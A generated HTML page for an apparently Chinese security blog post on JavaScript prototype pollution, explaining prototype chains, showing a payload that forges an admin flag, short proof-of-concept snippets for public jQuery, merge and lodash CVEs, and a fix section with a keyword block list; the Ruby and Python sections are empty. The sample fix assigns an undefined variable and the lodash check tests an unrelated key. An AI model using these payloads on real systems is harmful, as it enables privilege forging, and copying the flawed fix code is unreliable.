@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"ayan0.top","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.24.1","exturl":false,"sidebar":{"position":"left","width_expanded":280,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":false,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="原型链污染的攻击与防御 先讲最为经典的Javascript原型链污染，再拓展到其他语言例如python和ruby  JavaScript">
+<meta property="og:type" content="article">
+<meta property="og:title" content="原型链污染的攻击与修复">
+<meta property="og:url" content="https://ayan0.top/2025/09/08/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E4%BF%AE%E5%A4%8D/">
+<meta property="og:site_name" content="Blog of AyaN0">
+<meta property="og:description" content="原型链污染的攻击与防御 先讲最为经典的Javascript原型链污染，再拓展到其他语言例如python和ruby  JavaScript">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://image.3001.net/images/20210601/1622510962_60b58d728e2926e943511.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20210601/1622510987_60b58d8bcb484a21265a7.png!small">
+<meta property="article:published_time" content="2025-09-07T23:45:15.000Z">
+<meta property="article:modified_time" content="2025-09-10T05:46:45.914Z">
+<meta property="article:author" content="AyaN0">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="原型链污染">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.3001.net/images/20210601/1622510962_60b58d728e2926e943511.png!small">
+
+
+<link rel="canonical" href="https://ayan0.top/2025/09/08/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E4%BF%AE%E5%A4%8D/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://ayan0.top/2025/09/08/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E4%BF%AE%E5%A4%8D/","path":"2025/09/08/原型链污染的攻击与修复/","title":"原型链污染的攻击与修复"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>原型链污染的攻击与修复 | Blog of AyaN0</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+      <img class="custom-logo-image" src="/images/lly.jpg" alt="Blog of AyaN0">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Blog of AyaN0</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="nav-number">1.</span> <span class="nav-text"> 原型链污染的攻击与防御</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#javascript"><span class="nav-number">1.1.</span> <span class="nav-text"> JavaScript</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%BA%E7%90%86"><span class="nav-number">1.1.1.</span> <span class="nav-text"> 机理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">1.1.2.</span> <span class="nav-text"> 利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%80%92%E5%BD%92%E5%90%88%E5%B9%B6merge"><span class="nav-number">1.1.2.1.</span> <span class="nav-text"> 不安全的递归合并(Merge)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#jqueryextendcve-2019-11358"><span class="nav-number">1.1.2.1.1.</span> <span class="nav-text"> jQuery.extend:CVE-2019-11358</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#mergerecursivemerge-cve-2020-28499"><span class="nav-number">1.1.2.1.2.</span> <span class="nav-text"> merge.recursiveMerge :CVE-2020-28499</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#lodashdefaultsdeep-cve-2019-10744"><span class="nav-number">1.1.2.1.3.</span> <span class="nav-text"> lodash.defaultsDeep : CVE-2019-10744</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8C%89%E8%B7%AF%E5%BE%84%E5%AE%9A%E4%B9%89%E5%B1%9E%E6%80%A7"><span class="nav-number">1.1.2.2.</span> <span class="nav-text"> 按路径定义属性</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D"><span class="nav-number">1.1.3.</span> <span class="nav-text"> 修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ruby"><span class="nav-number">1.2.</span> <span class="nav-text"> Ruby</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python"><span class="nav-number">1.3.</span> <span class="nav-text"> Python</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0"><span class="nav-number">1.4.</span> <span class="nav-text"> 后记</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="AyaN0"
+      src="/images/lly.jpg">
+  <p class="site-author-name" itemprop="name">AyaN0</p>
+  <div class="site-description" itemprop="description">不断的前进的人:只有0次摔倒或无数次的爬起</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/kisakiayano" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kisakiayano" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1594453512@qq.com" title="E-Mail → 1594453512@qq.com" rel="noopener me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ayan0.top/2025/09/08/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E4%BF%AE%E5%A4%8D/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lly.jpg">
+      <meta itemprop="name" content="AyaN0">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Blog of AyaN0">
+      <meta itemprop="description" content="不断的前进的人:只有0次摔倒或无数次的爬起">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="原型链污染的攻击与修复 | Blog of AyaN0">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          原型链污染的攻击与修复
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-09-08 07:45:15" itemprop="dateCreated datePublished" datetime="2025-09-08T07:45:15+08:00">2025-09-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-09-10 13:46:45" itemprop="dateModified" datetime="2025-09-10T13:46:45+08:00">2025-09-10</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>4.2k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>8 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="原型链污染的攻击与防御"><a class="markdownIt-Anchor" href="#原型链污染的攻击与防御"></a> 原型链污染的攻击与防御</h1>
+<p>先讲最为经典的Javascript原型链污染，再拓展到其他语言例如python和ruby</p>
+<h2 id="javascript"><a class="markdownIt-Anchor" href="#javascript"></a> JavaScript</h2>
+<h3 id="机理"><a class="markdownIt-Anchor" href="#机理"></a> 机理</h3>
+<p>在js中，函数有<code>prototype</code>属性，对象有<code>__proto__</code>属性</p>
+<p>对象是由函数产生 的</p>
+<p>对象的<code>__proto__</code>属性指向函数的<code>prototype</code>属性</p>
+<p>来看一段代码来理解一下原型这个东西，其实和我们python的SSTI的继承链很像</p>
+<pre><code class="highlight js"><span class="keyword">let</span> obj = &#123;&#125;;
+<span class="variable language_">console</span>.<span class="title function_">log</span>(obj);
+<span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">__proto__</span>);
+<span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">__proto__</span>.<span class="property">__proto__</span>);</code></pre>
+<p>接着我们会看到输出</p>
+<pre><code class="highlight plaintext">&#123;&#125;
+[Object: null prototype] &#123;&#125;
+null</code></pre>
+<p>可以理出来这样的关系obj–&gt;Object–&gt;null</p>
+<p>而Object自身的proto为null</p>
+<p>也许你觉得不够直观，那么我会举出下面的例子:</p>
+<pre><code class="highlight js"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name, age, gender</span>) &#123;
+  <span class="variable language_">this</span>.<span class="property">name</span> = name;
+  <span class="variable language_">this</span>.<span class="property">age</span> = age;
+  <span class="variable language_">this</span>.<span class="property">gender</span> = gender;
+&#125;
+
+<span class="keyword">var</span> person = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;lyc&#x27;</span>, <span class="number">30</span>, <span class="string">&#x27;male&#x27;</span>);
+<span class="variable language_">console</span>.<span class="title function_">log</span>(person);</code></pre>
+<p>写一个html文件接着在里面引用这个js文件</p>
+<p>在控制台就能看到</p>
+<p>![屏幕截图 2025-09-10 083830](<a target="_blank" rel="noopener" href="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/屏幕截图</a> 2025-09-10 083830.png)</p>
+<p>在网上找了一张图来总结:</p>
+<p><img src="https://image.3001.net/images/20210601/1622510962_60b58d728e2926e943511.png!small" alt="图片1.png"></p>
+<p>不难看到所有对象的原型最终都会指向Object.prototype，接着指向null</p>
+<p>那么到现在为止所讲的，和我们所说的污染有什么关系呢?我们再引入一个函数</p>
+<pre><code class="highlight js"><span class="keyword">function</span> <span class="title function_">Teacher</span>(<span class="params">name,age,gender,subject</span>)&#123;
+	<span class="title class_">Person</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>,name);
+	<span class="title class_">Person</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>,age);
+	<span class="title class_">Person</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>,gender);
+	<span class="variable language_">this</span>.<span class="property">subject</span>=subject;
+&#125;
+<span class="title class_">Teacher</span>.<span class="property"><span class="keyword">prototype</span></span>=<span class="keyword">new</span> <span class="title class_">Person</span>();</code></pre>
+<p>再对Person稍作修改</p>
+<pre><code class="highlight js"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name, age, gender,nation</span>) &#123;
+  <span class="variable language_">this</span>.<span class="property">name</span> = name;
+  <span class="variable language_">this</span>.<span class="property">age</span> = age;
+  <span class="variable language_">this</span>.<span class="property">gender</span> = gender;
+  <span class="variable language_">this</span>.<span class="property">nation</span> =<span class="string">&#x27;China&#x27;</span>;
+&#125;</code></pre>
+<p>此时就会有</p>
+<p><img src="https://image.3001.net/images/20210601/1622510987_60b58d8bcb484a21265a7.png!small" alt="图片2.png"></p>
+<p>接下来用以下代码测试</p>
+<pre><code class="highlight js"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name, age, gender,nation</span>) &#123;
+  <span class="variable language_">this</span>.<span class="property">name</span> = name;
+  <span class="variable language_">this</span>.<span class="property">age</span> = age;
+  <span class="variable language_">this</span>.<span class="property">gender</span> = gender;
+  <span class="variable language_">this</span>.<span class="property">nation</span> =<span class="string">&quot;China&quot;</span>;
+&#125;
+<span class="keyword">function</span> <span class="title function_">Teacher</span>(<span class="params">name,age,gender,subject</span>)&#123;
+	<span class="title class_">Person</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>,name);
+	<span class="title class_">Person</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>,age);
+	<span class="title class_">Person</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>,gender);
+	<span class="variable language_">this</span>.<span class="property">subject</span>=subject;
+&#125;
+<span class="title class_">Teacher</span>.<span class="property"><span class="keyword">prototype</span></span>=<span class="keyword">new</span> <span class="title class_">Person</span>();
+
+<span class="keyword">var</span> person = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;lyc&#x27;</span>, <span class="number">30</span>, <span class="string">&#x27;male&#x27;</span>,<span class="string">&quot;China&quot;</span>);
+<span class="keyword">var</span> teacher =<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;lyc&#x27;</span>,<span class="number">30</span>,<span class="string">&#x27;male&#x27;</span>,<span class="string">&#x27;math&#x27;</span>);
+<span class="variable language_">console</span>.<span class="title function_">log</span>(teacher.<span class="property">nation</span>);
+<span class="comment">//China</span></code></pre>
+<p>为什么我们明明没有给Teacher定义nation的属性，却可以打印出nation呢</p>
+<pre><code class="highlight plaintext">在JavaScript里，每个对象都有一个原型（prototype），这个原型本身也是一个对象，它也有自己的原型，这样就形成了一条链，叫做原型链。当你访问一个对象的属性时，如果这个对象本身没有，JavaScript引擎就会沿着原型链往上找，直到找到为止。</code></pre>
+<p>所以我们就明白了原型链污染的原理了:通过污染原型的属性来达成攻击目的</p>
+<p>那么假如我们正在使用一个合并的函数，那么就可以通过构造<code>&#123;&quot;__proto__&quot;:&#123;&quot;isAdmin&quot;:true&#125;&#125;</code>来污染原型进而实现伪造admin</p>
+<blockquote>
+<p>[!NOTE]</p>
+<ul>
+<li><code>__proto__</code> 是一个非标准的属性，但在大多数JavaScript引擎中都支持，它指向对象的原型。</li>
+<li>有些库或框架可能会使用其他的属性来表示原型，比如 <code>constructor.prototype</code>。</li>
+</ul>
+</blockquote>
+<h3 id="利用"><a class="markdownIt-Anchor" href="#利用"></a> 利用</h3>
+<p>以下的利用需要自己去看，去理解，去复现，碍于篇幅我就不在分析，网上的文章也很多</p>
+<h4 id="不安全的递归合并merge"><a class="markdownIt-Anchor" href="#不安全的递归合并merge"></a> 不安全的递归合并(Merge)</h4>
+<h5 id="jqueryextendcve-2019-11358"><a class="markdownIt-Anchor" href="#jqueryextendcve-2019-11358"></a> jQuery.extend:CVE-2019-11358</h5>
+<p>3.4.0版本之前的jQuery存在一个原型污染漏洞CVE-2019-11358，PoC如下。</p>
+<pre><code class="highlight plaintext">$.extend(true, &#123;&#125;, JSON.parse(&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;z&quot;: 123&#125;&#125;&#x27;))
+
+console.log(z); // 123</code></pre>
+<h5 id="mergerecursivemerge-cve-2020-28499"><a class="markdownIt-Anchor" href="#mergerecursivemerge-cve-2020-28499"></a> merge.recursiveMerge :CVE-2020-28499</h5>
+<p>此 CVE 影响 2.1.1 以下的 merge 版本</p>
+<p>测试代码：</p>
+<pre><code class="highlight plaintext">const merge = require(&#x27;merge&#x27;);
+
+const payload2 = JSON.parse(&#x27;&#123;&quot;x&quot;: &#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;:&quot;yes&quot;&#125;&#125;&#125;&#x27;);
+
+let obj1 = &#123;x: &#123;y:1&#125;&#125;;
+
+console.log(&quot;Before : &quot; + obj1.polluted);
+merge.recursive(obj1, payload2);
+console.log(&quot;After : &quot; + obj1.polluted);
+console.log(&quot;After : &quot; + &#123;&#125;.polluted);</code></pre>
+<h5 id="lodashdefaultsdeep-cve-2019-10744"><a class="markdownIt-Anchor" href="#lodashdefaultsdeep-cve-2019-10744"></a> lodash.defaultsDeep : CVE-2019-10744</h5>
+<p>2019 年 7 月 2 日，Snyk 发布了一个高严重性原型污染安全漏洞（CVE-2019-10744），影响了小于 4.17.12 的所有版本的 lodash。</p>
+<p>Lodash 库中的 defaultsDeep 函数可能会被包含 constructor 的 Payload 诱骗添加或修改Object.prototype 。最终可能导致 Web 应用程序崩溃或改变其行为，具体取决于受影响的用例。以下是 Snyk 给出的此漏洞验证 POC：</p>
+<pre><code class="highlight plaintext">const mergeFn = require(&#x27;lodash&#x27;).defaultsDeep;
+const payload = &#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;whoami&quot;: &quot;Vulnerable&quot;&#125;&#125;&#125;&#x27;
+
+function check() &#123;
+    mergeFn(&#123;&#125;, JSON.parse(payload));
+    if ((&#123;&#125;)[`a0`] === true) &#123;
+        console.log(`Vulnerable to Prototype Pollution via $&#123;payload&#125;`);
+    &#125;
+  &#125;
+
+check();
+
+console.log(Object.whoami);</code></pre>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/248170#h2-6">从 Lodash 原型链污染到模板 RCE-安全KER - 安全资讯平台</a></p>
+<h4 id="按路径定义属性"><a class="markdownIt-Anchor" href="#按路径定义属性"></a> 按路径定义属性</h4>
+<h3 id="修复"><a class="markdownIt-Anchor" href="#修复"></a> 修复</h3>
+<p>js原型链污染的修复相对较为容易</p>
+<p>只要把常用的关键字都给waf掉就可以</p>
+<pre><code class="highlight plaintext">const proto = [&#x27;__proto__&#x27;, &#x27;constructor&#x27;, &#x27;prototype&#x27;]</code></pre>
+<p>套用到递归函数里面把它变安全</p>
+<pre><code class="highlight plaintext">function safeMerge(target, source) &#123;
+    for (const key in source) &#123;
+        if (key === &#x27;outputFunctionName&#x27;||key === &#x27;__proto__&#x27; || key === &#x27;constructor&#x27;||key ===&#x27;prototype&#x27;) &#123;
+            continue; // 跳过敏感属性
+        &#125;
+        
+        if (typeof target[key] === &#x27;object&#x27; &amp;&amp; typeof source[key] === &#x27;object&#x27;) &#123;
+            safeMerge(target[key], source[key]);
+        &#125; else &#123;
+            target[key] = value;
+        &#125;
+    &#125;
+&#125;</code></pre>
+<p>或者也可以从源头上解决问题,将有可能发生污染的对象obj做以下任一操作/重写:</p>
+<ul>
+<li><code>let obj=Object.create(null);</code></li>
+<li><code>const o=Object.freeze(obj);</code></li>
+<li><code>let obj =new Map();</code></li>
+<li><code>let obj =new Set();</code></li>
+</ul>
+<h2 id="ruby"><a class="markdownIt-Anchor" href="#ruby"></a> Ruby</h2>
+<p>为什么我先讲Ruby而不是Python呢，因为Ruby也是OOP语言，并且更加贴近于js（虽说其实是先发现了Python的原型链才引出了Ruby的类污染</p>
+<h2 id="python"><a class="markdownIt-Anchor" href="#python"></a> Python</h2>
+<h2 id="后记"><a class="markdownIt-Anchor" href="#后记"></a> 后记</h2>
+<p>最近太忙了，比赛一大堆，还赶上开学，复现要等后续了，现在当务之急是赶快学到能够上场的程度。。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.jpg" alt="AyaN0 微信">
+        <span>微信</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"># Web</a>
+              <a href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="tag"># 原型链污染</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/09/07/%E8%AE%B02025%E5%AE%81%E6%B3%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B/" rel="prev" title="记2025宁波网络安全大赛决赛">
+                  <i class="fa fa-angle-left"></i> 记2025宁波网络安全大赛决赛
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/09/11/php-ini%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE%E7%BB%95%E8%BF%87/" rel="next" title="php.ini相关配置绕过">
+                  php.ini相关配置绕过 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">AyaN0</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">332k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">10:03</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
